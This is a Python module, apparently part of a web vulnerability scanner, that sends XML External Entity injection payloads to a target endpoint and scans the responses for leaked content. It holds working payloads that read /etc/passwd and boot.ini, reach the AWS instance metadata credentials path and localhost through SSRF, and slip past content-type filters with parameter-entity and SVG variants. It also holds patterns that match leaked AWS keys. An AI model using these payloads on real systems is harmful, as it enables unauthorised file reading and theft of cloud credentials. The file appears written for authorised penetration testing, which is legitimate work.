"""
XXE (XML External Entity) injection bypass module.

Injects XXE payloads into XML-accepting endpoints. Detects:
  - Error-based: server returns file contents in error message
  - Reflection-based: file contents echoed in response body
  - Blind: out-of-band (response time / status code anomaly)

Techniques:
  1. Classic inline entity       — file:///etc/passwd
  2. Parameter entity            — % xxe;
  3. Internal service probe      — http://localhost/
  4. Error-based exfil           — force entity resolution in DTD path
  5. SSRF via XXE                — http://169.254.169.254/ (cloud metadata)
  6. DOCTYPE SVG/HTML context    — SVG bypass for content-type filters

NOTE: Billion-laughs (DoS) is intentionally excluded.
"""

import asyncio
import re
from typing import Optional

import httpx

from . import BypassResult

try:
    from scope_validator import ScopeValidator
except ImportError:
    ScopeValidator = None
try:
    from rate_limiter import RateLimiter
except ImportError:
    RateLimiter = None

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

# Patterns that confirm file read or internal access
_CONFIRM_PATTERNS: list[tuple[str, str]] = [
    (r"root:x:0:0",           "Linux /etc/passwd content"),
    (r"root:!:0:0",           "Linux /etc/shadow fragment"),
    (r"\[boot loader\]",      "Windows boot.ini content"),
    (r"ami-[0-9a-f]{8,17}",   "AWS IMDS AMI ID"),
    (r"AKIA[0-9A-Z]{16}",     "AWS access key"),
    (r'"AccessKeyId"',        "AWS credentials JSON"),
    (r"metadata-flavor",      "GCP metadata header reflection"),
    (r"<title>.*Index of",    "Internal directory listing"),
]

# Each tuple: (category, description, xml_body, content_type)
_PAYLOADS: list[tuple[str, str, str, str]] = [
    # 1. Classic file read — inline entity
    (
        "file_read",
        "file:///etc/passwd via inline entity",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<root><data>&xxe;</data></root>",
        "application/xml",
    ),
    # 2. Parameter entity — sometimes bypasses simple entity filters
    (
        "param_entity",
        "file:///etc/passwd via parameter entity",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>'
        "<root/>",
        "application/xml",
    ),
    # 3. Windows path
    (
        "windows_file",
        "Windows boot.ini via inline entity",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>'
        "<root><data>&xxe;</data></root>",
        "application/xml",
    ),
    # 4. SSRF via XXE — AWS metadata
    (
        "ssrf_aws",
        "SSRF via XXE to AWS IMDS",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>'
        "<root><data>&xxe;</data></root>",
        "application/xml",
    ),
    # 5. SSRF via XXE — localhost
    (
        "ssrf_localhost",
        "SSRF via XXE to localhost:80",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/">]>'
        "<root><data>&xxe;</data></root>",
        "application/xml",
    ),
    # 6. text/xml content-type variant
    (
        "file_read_text_xml",
        "file:///etc/passwd via text/xml",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<root><data>&xxe;</data></root>",
        "text/xml",
    ),
    # 7. SVG context bypass (often accepted by image upload endpoints)
    (
        "svg_entity",
        "file:///etc/passwd via SVG+XML",
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<svg><text>&xxe;</text></svg>',
        "image/svg+xml",
    ),
    # 8. Error-based — invalid entity path to leak path in error
    (
        "error_based",
        "Error-based XXE path disclosure",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///DOESNOTEXIST_xxe_probe">]>'
        "<root><data>&xxe;</data></root>",
        "application/xml",
    ),
]

# ---------------------------------------------------------------------------
# XXEBypass
# ---------------------------------------------------------------------------

class XXEBypass:
    name = "XXE"
    description = "XML External Entity injection"
    requires_param = False

    async def detect(
        self,
        target: str,
        client: httpx.AsyncClient,
        limiter,
    ) -> bool:
        """Return True if the endpoint accepts XML (Content-Type: application/xml → non-4xx)."""
        probe = '<?xml version="1.0"?><root><probe>xxe_detect</probe></root>'
        try:
            async with limiter.http():
                resp = await client.post(
                    target,
                    content=probe.encode(),
                    headers={"Content-Type": "application/xml"},
                )
                limiter.adapt_to_response(resp)
                # 4xx on XML but 2xx on anything = XML not accepted
                return resp.status_code not in (400, 415, 405)
        except httpx.RequestError:
            return False

    async def scan(
        self,
        target: str,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        limiter,
        param: Optional[str] = None,
    ) -> list[BypassResult]:
        coros = [
            self._probe(target, category, desc, body, ctype, client, sem, limiter)
            for category, desc, body, ctype in _PAYLOADS
        ]
        raw = await asyncio.gather(*coros, return_exceptions=True)

        results: list[BypassResult] = []
        for (category, desc, body, ctype), result in zip(_PAYLOADS, raw):
            if isinstance(result, Exception):
                results.append(BypassResult(
                    success=False, vuln_type="xxe", technique="entity_injection",
                    category=category, payload=desc, url=target,
                    status_code=0, evidence="", note=f"error: {result}",
                ))
            else:
                results.append(result)
        return results

    async def _probe(
        self,
        target: str,
        category: str,
        desc: str,
        body: str,
        content_type: str,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        limiter,
    ) -> BypassResult:
        async with sem:
            try:
                async with limiter.http():
                    resp = await client.post(
                        target,
                        content=body.encode(),
                        headers={"Content-Type": content_type},
                    )
                    limiter.adapt_to_response(resp)
            except httpx.RequestError as e:
                return BypassResult(
                    success=False, vuln_type="xxe", technique="entity_injection",
                    category=category, payload=desc, url=target,
                    status_code=0, evidence="", note=f"request_error: {e}",
                )

        text = resp.text
        matched = next(
            (description for pattern, description in _CONFIRM_PATTERNS
             if re.search(pattern, text, re.IGNORECASE)),
            None,
        )

        # Also flag 500 errors — may be error-based exfil or entity processing
        server_error = resp.status_code >= 500
        success = matched is not None
        note = matched or ("server_error — possible error-based XXE" if server_error else "")

        return BypassResult(
            success=success,
            vuln_type="xxe",
            technique="entity_injection",
            category=category,
            payload=desc,
            url=target,
            status_code=resp.status_code,
            evidence=text[:300],
            note=note,
        )
